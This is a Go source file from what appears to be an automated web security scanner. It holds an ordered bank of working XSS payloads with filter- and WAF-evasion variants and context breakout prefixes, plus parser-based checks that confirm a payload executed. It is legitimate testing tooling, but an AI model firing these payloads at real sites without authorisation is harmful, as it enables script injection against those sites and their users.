package scanner

import (
	"strings"

	xhtml "golang.org/x/net/html"
)

// XSS executing-payload bank for the active DAST confirm stage.
//
// The engine first proves *HTML injection* with a benign marker element, then
// must prove *execution* with a payload the application did NOT filter — otherwise
// the reported PoC is a real bug with a dead payload ("finds XSS but no popup").
// This bank supplies, per context, an ORDERED ladder of real executing payloads:
// the cleanest vector first, then progressively more filter/WAF-evasive variants
// (case mixing, slash separators, rare tags, rare event handlers, no-quote forms).
// The confirm stage fires them in order and reports the FIRST whose element +
// handler survive UNENCODED as live markup — i.e. one that actually pops.
//
// Every JS body is alert(document.domain) so a triager instantly sees WHICH origin
// executed, and the token/elem let the browserless confirm assert the exact
// executing bytes survived (not just that some tag formed).

// xssExecPayload is one executing vector.
type xssExecPayload struct {
	Payload string // full injection value
	Elem    string // element name that must form as a live start tag
	Token   string // lowercased substring (handler/scheme) that must survive raw
}

// xssAlert is the JS body used across the bank.
const xssAlert = "alert(document.domain)"

// htmlTextExecLadder returns executing payloads for an HTML-TEXT context (or any
// context already broken out into HTML text via a prefix). Ordered cleanest →
// most evasive so the report shows the simplest working vector, but a filtered app
// still yields a bypass that pops. Curated from the well-known XSS vector families
// (PortSwigger / HTML5 cheat sheets): auto-firing elements, then WAF-evasion
// (slash/case/whitespace/no-quote), then rare tags & events, then JS-call
// obfuscation for filters that target the string "alert(".
func htmlTextExecLadder() []xssExecPayload {
	return []xssExecPayload{
		// ── primary auto-firing vectors (no interaction) ──
		{`<svg onload=` + xssAlert + `>`, "svg", "onload"},
		{`<img src=x onerror=` + xssAlert + `>`, "img", "onerror"},
		{`<script>` + xssAlert + `</script>`, "script", xssAlert},
		{`<svg><script>` + xssAlert + `</script></svg>`, "script", xssAlert},
		{`<details open ontoggle=` + xssAlert + `>`, "details", "ontoggle"},
		{`<video autoplay><source onerror=` + xssAlert + `></video>`, "video", "onerror"},
		{`<audio src=x onerror=` + xssAlert + `>`, "audio", "onerror"},
		{`<body onload=` + xssAlert + `>`, "body", "onload"},
		{`<svg><animate onbegin=` + xssAlert + ` attributeName=x dur=1s>`, "animate", "onbegin"},
		{`<marquee onstart=` + xssAlert + `>x</marquee>`, "marquee", "onstart"},
		{`<object data="javascript:` + xssAlert + `">`, "object", "javascript:"},
		{`<iframe srcdoc="&lt;script&gt;` + xssAlert + `&lt;/script&gt;">`, "iframe", "srcdoc"},
		// ── auto-focus vectors (fire without a mouse) ──
		{`<input autofocus onfocus=` + xssAlert + `>`, "input", "onfocus"},
		{`<select autofocus onfocus=` + xssAlert + `>`, "select", "onfocus"},
		{`<textarea autofocus onfocus=` + xssAlert + `>`, "textarea", "onfocus"},
		{`<keygen autofocus onfocus=` + xssAlert + `>`, "keygen", "onfocus"},
		// ── WAF-evasion: slash separators, case mixing, whitespace, no-space ──
		{`<svg/onload=` + xssAlert + `>`, "svg", "onload"},
		{`<sVg oNloAd=` + xssAlert + `>`, "svg", "onload"},
		{`<iMg sRc=x oNerRor=` + xssAlert + `>`, "img", "onerror"},
		{"<svg\tonload=" + xssAlert + ">", "svg", "onload"},
		{"<svg\nonload=" + xssAlert + ">", "svg", "onload"},
		{`<svg onload=` + xssAlert + `//`, "svg", "onload"},
		// In an HTML document the tokenizer aliases the obsolete <image> spelling
		// to a live <img> element. Correlate against the parsed name, not the source
		// spelling, so this evasive vector remains detectable.
		{`<image src=x onerror=` + xssAlert + `>`, "img", "onerror"},
		// ── rare tags / rare events (bypass tag/handler allowlists) ──
		{`<xss id=x tabindex=1 onfocusin=` + xssAlert + `></xss>`, "xss", "onfocusin"},
		{`<div onpointerenter=` + xssAlert + `>x</div>`, "div", "onpointerenter"},
		{`<style onload=` + xssAlert + `></style>`, "style", "onload"},
		{`<svg><set attributeName=x onbegin=` + xssAlert + `>`, "set", "onbegin"},
		{`<form><button formaction=javascript:` + xssAlert + `>x`, "button", "formaction"},
		// ── JS-call obfuscation (filter targets the literal "alert(") ──
		{`<svg onload=confirm(document.domain)>`, "svg", "confirm("},
		{`<svg onload=print()>`, "svg", "print("},
		{`<svg onload=(alert)(document.domain)>`, "svg", "(alert)"},
		{"<svg onload=top[`al`+`ert`](document.domain)>", "svg", "onload"},
		{`<svg onload=eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))>`, "svg", "eval("},
	}
}

// prefixLadder prepends a context breakout prefix to every HTML-text vector and
// remaps the (elem, token) unchanged, so the survival check stays exact.
func prefixLadder(prefix string) []xssExecPayload {
	base := htmlTextExecLadder()
	out := make([]xssExecPayload, 0, len(base))
	for _, p := range base {
		out = append(out, xssExecPayload{Payload: prefix + p.Payload, Elem: p.Elem, Token: p.Token})
	}
	return out
}

// buildExecPayloads returns the ordered executing-payload ladder for the proven
// reflection context. Attribute/URL/JS/CSS contexts get the correct breakout
// prefix so the vector escapes into HTML text; HTML text uses the ladder directly.
func buildExecPayloads(a ReflectionAnalysis) []xssExecPayload {
	switch a.Context {
	case CtxHTMLText:
		return htmlTextExecLadder()
	case CtxQuotedAttr, CtxURL:
		q := `"`
		if a.Quote == '\'' {
			q = "'"
		}
		// close the quoted value, close the tag, then a fresh executing element.
		ladder := prefixLadder(q + `>`)
		if a.Context == CtxURL {
			// href/src sinks also execute a javascript: scheme on click/navigation —
			// no tag needed. Offered first as the canonical URL-sink vector.
			ladder = append([]xssExecPayload{
				{`javascript:` + xssAlert, "", "javascript:" + xssAlert},
			}, ladder...)
		}
		return ladder
	case CtxUnquotedAttr:
		// no quote to break: a space starts a new attribute; also full tag breakout.
		return append([]xssExecPayload{
			{` autofocus onfocus=` + xssAlert + ` x=`, "", "onfocus=" + xssAlert},
		}, prefixLadder(`>`)...)
	case CtxEventHandler:
		// Nested JavaScript-in-HTML context. Tagless JS breakouts require runtime
		// proof; an HTML-quote breakout also gets the parsed-element ladder.
		direct := []xssExecPayload{{`';` + xssAlert + `//`, "", `';` + xssAlert}}
		if a.JSQuote == '"' {
			direct[0] = xssExecPayload{`";` + xssAlert + `//`, "", `";` + xssAlert}
		} else if a.JSQuote == '`' {
			direct[0] = xssExecPayload{"${" + xssAlert + "}", "", "${" + xssAlert}
		}
		if a.Quote != 0 {
			direct = append(direct, prefixLadder(string(a.Quote)+`>`)...)
		}
		return direct
	case CtxJSString:
		// close the string/stmt then run; also </script> breakout into HTML text.
		return append([]xssExecPayload{
			{`';` + xssAlert + `//`, "", `';` + xssAlert},
			{`";` + xssAlert + `//`, "", `";` + xssAlert},
		}, prefixLadder(`</script>`)...)
	case CtxJSExpr:
		return append([]xssExecPayload{
			{`;` + xssAlert + `//`, "", `;` + xssAlert},
		}, prefixLadder(`</script>`)...)
	case CtxCSS:
		return prefixLadder(`</style>`)
	case CtxComment:
		return prefixLadder(`-->`)
	case CtxRCDATA:
		close := a.CloseTag
		if close == "" {
			close = `</textarea>`
		}
		return prefixLadder(close)
	default:
		return htmlTextExecLadder()
	}
}

// execPayloadSurvived reports whether the executing primitive from p survived on
// the SAME parsed element/subtree in the response. Element-name and token checks
// must never be independent: a page may already contain a legitimate <svg> while
// reflecting our URL-encoded "onload" text inside og:url. The old global checks
// joined those unrelated facts and produced a false positive.
//
// We parse p to derive its exact executable signal (event-handler name+value,
// javascript: URL, srcdoc, or script body), then require that signal beneath a
// live response element named p.Elem. Percent-encoded or quoted-attribute text
// does not become such a node. Tagless JS/URL vectors still require runtime proof.
func execPayloadSurvived(body string, p xssExecPayload) bool {
	if p.Elem == "" {
		// Exact tagless text survival is still only reflection. Whether a JS
		// expression/scheme/handler is syntactically live requires runtime proof.
		return false
	}
	want := expectedExecSignals(p)
	if len(want) == 0 {
		return false
	}
	doc, err := xhtml.Parse(strings.NewReader(body))
	if err != nil {
		return false
	}
	return elementSubtreeHasSignals(doc, strings.ToLower(strings.TrimSpace(p.Elem)), want)
}

type execSignal struct {
	kind  string // event | javascript-url | srcdoc | script
	name  string // attribute name for attribute-backed signals
	value string
}

// expectedExecSignals parses the payload in a normal HTML body and extracts only
// browser-executable primitives. Generic attributes such as src=x/autofocus are
// deliberately ignored: they cannot prove that JavaScript survived.
func expectedExecSignals(p xssExecPayload) []execSignal {
	doc, err := xhtml.Parse(strings.NewReader("<!doctype html><html><body>" + p.Payload + "</body></html>"))
	if err != nil {
		return nil
	}
	var target *xhtml.Node
	var find func(*xhtml.Node)
	find = func(n *xhtml.Node) {
		if target != nil {
			return
		}
		if n.Type == xhtml.ElementNode && strings.EqualFold(n.Data, p.Elem) {
			target = n
			return
		}
		for ch := n.FirstChild; ch != nil; ch = ch.NextSibling {
			find(ch)
		}
	}
	find(doc)
	if target == nil {
		return nil
	}
	return collectExecSignals(target)
}

func collectExecSignals(root *xhtml.Node) []execSignal {
	var out []execSignal
	var walk func(*xhtml.Node)
	walk = func(n *xhtml.Node) {
		if n.Type == xhtml.ElementNode {
			for _, attr := range n.Attr {
				name := strings.ToLower(strings.TrimSpace(attr.Key))
				value := strings.TrimSpace(attr.Val)
				switch {
				case strings.HasPrefix(name, "on") && len(name) > 2 && value != "":
					out = append(out, execSignal{kind: "event", name: name, value: value})
				case name == "srcdoc" && value != "":
					out = append(out, execSignal{kind: "srcdoc", name: name, value: value})
				case value != "" && strings.HasPrefix(strings.ToLower(value), "javascript:"):
					out = append(out, execSignal{kind: "javascript-url", name: name, value: value})
				}
			}
			if strings.EqualFold(n.Data, "script") {
				if value := strings.TrimSpace(nodeText(n)); value != "" {
					out = append(out, execSignal{kind: "script", value: value})
				}
			}
		}
		for ch := n.FirstChild; ch != nil; ch = ch.NextSibling {
			walk(ch)
		}
	}
	walk(root)
	return out
}

func nodeText(root *xhtml.Node) string {
	var b strings.Builder
	var walk func(*xhtml.Node)
	walk = func(n *xhtml.Node) {
		if n.Type == xhtml.TextNode {
			b.WriteString(n.Data)
		}
		for ch := n.FirstChild; ch != nil; ch = ch.NextSibling {
			walk(ch)
		}
	}
	walk(root)
	return b.String()
}

func elementSubtreeHasSignals(root *xhtml.Node, element string, want []execSignal) bool {
	if root.Type == xhtml.ElementNode && strings.EqualFold(root.Data, element) {
		got := collectExecSignals(root)
		if allExecSignalsPresent(got, want) {
			return true
		}
	}
	for ch := root.FirstChild; ch != nil; ch = ch.NextSibling {
		if elementSubtreeHasSignals(ch, element, want) {
			return true
		}
	}
	return false
}

func allExecSignalsPresent(got, want []execSignal) bool {
	for _, expected := range want {
		matched := false
		for _, actual := range got {
			if actual.kind == expected.kind && actual.name == expected.name && actual.value == expected.value {
				matched = true
				break
			}
		}
		if !matched {
			return false
		}
	}
	return len(want) > 0
}
